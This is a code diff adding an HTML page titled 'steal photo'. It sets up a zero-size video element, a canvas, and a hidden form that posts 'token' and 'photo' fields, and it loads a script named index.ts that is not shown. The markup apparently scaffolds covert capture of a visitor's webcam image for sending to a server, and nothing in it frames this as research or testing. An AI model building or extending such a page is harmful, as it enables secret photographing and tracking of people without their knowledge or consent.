@@ -1,0 +1,19 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>steal photo</title>
+  </head>
+  <body>
+    <div id="root">
+      <video width="0" height="0" id="video"></video>
+      <canvas id="canvas"></canvas>
+      <form id="form" method="post">
+        <input type="hidden" id="token-input" name="token" />
+        <input type="hidden" id="photo-input" name="photo" />
+      </form>
+    </div>
+    <script src="./index.ts" type="module"></script>
+  </body>
+</html>
